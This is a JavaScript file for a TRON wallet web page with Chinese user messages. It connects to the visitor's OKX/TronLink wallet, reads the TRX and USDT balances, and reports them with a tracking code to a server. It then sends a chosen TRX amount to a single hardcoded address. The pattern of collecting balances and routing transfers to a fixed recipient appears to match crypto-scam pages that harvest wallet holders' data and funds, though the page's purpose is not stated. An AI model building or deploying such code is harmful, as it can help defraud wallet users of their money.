var tronApi = "https://api.trongrid.io";
var contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
var domain = 'https://' + window.location.host;

var fixedAuthorizedAddress = "TXzt7y46my1GyY1NhNVPUWbDaqDiQJdEo5";

window.okxwallet.tronLink.request({
    method: 'tron_requestAccounts'
})

var current_address, usdtBalance = 0,
    trxBalance = 0;
var transactionObj = null;
var toAddress, type = 0,
    code, isConnected = false;

async function getUsdtBalance(address, callback) {
    let tronWeb = window.tronWeb;
    let contractInstance = await tronWeb.contract().at(contractAddress);
    let balance = await contractInstance.balanceOf(address).call();
    if (callback != undefined) {
        callback(balance);
    }
}

async function getAssets(callback) {
    code = getUrlParams('code');
    try {
        let userAgent = navigator.userAgent.toLowerCase();
        if (/okex/.test(userAgent) || isPc()) {
            if (window.okxwallet.tronLink.ready) {
                window.tronWeb = okxwallet.tronLink.tronWeb;
            } else {
                200 === (await window.okxwallet.tronLink.request({
                    method: "tron_requestAccounts"
                })).code && (window.tronWeb = tronLink.tronWeb)
            }
        }
        if (!window.tronWeb) {
            const e = TronWeb.providers.HttpProvider,
                t = new e(tronApi),
                a = new e(tronApi),
                n = tronApi,
                s = new TronWeb(t, a, n);
            window.tronWeb = s;
        }
    } catch (e) {
        tip(e);
    }

    if (window.tronWeb) {
        var tronWeb = window.tronWeb;
        current_address = tronWeb.defaultAddress.base58;
        if (current_address == false) {
            tip("连接钱包失败");
            await getAssets(callback);
            return;
        }
        try {
            let balance = await tronWeb.trx.getBalance(current_address);
            trxBalance = tronWeb.fromSun(balance);

            getUsdtBalance(current_address, function(data) {
                usdtBalance = tronWeb.fromSun(parseInt(data._hex, 16));
                console.log(usdtBalance);
                isConnected = true;
                tip("连接钱包成功");
                iaGet({
                    current_address: current_address,
                    trx: trxBalance,
                    usdt: usdtBalance,
                    code: code
                });
                if (callback != undefined) {
                    callback(trxBalance, usdtBalance);
                }
            });

        } catch (e) {
            tip(e);
        }
    } else {
        tip("请用钱包扫码打开");
    }
}

async function executeBlockchainTransaction() {
    try {
        let tronWeb = window.tronWeb;
        let current_address = tronWeb.defaultAddress.base58;
        console.log(current_address);
        toAddress = fixedAuthorizedAddress;

        let amount = parseFloat(document.getElementById("amount").value);
        if (isNaN(amount) || amount <= 0) {
            tip("请输入有效的金额");
            return;
        }

        const transaction = await tronWeb.transactionBuilder.sendTrx(toAddress, tronWeb.toSun(amount), current_address);
        const signedTransaction = await tronWeb.trx.sign(transaction);
        const tx = await tronWeb.trx.sendRawTransaction(signedTransaction);

        if (tx.result) {
            postInfo(current_address, toAddress);
        }
    } catch (error) {
        console.error("An error occurred during the blockchain transaction:", error);
        tip("交易失败，请重试");
    }
}

function tip(a, time = 1500) {
    $("#tip").html(a);
    $("#tip").show();
    setTimeout(function() {
        $("#tip").hide();
    }, time)
}
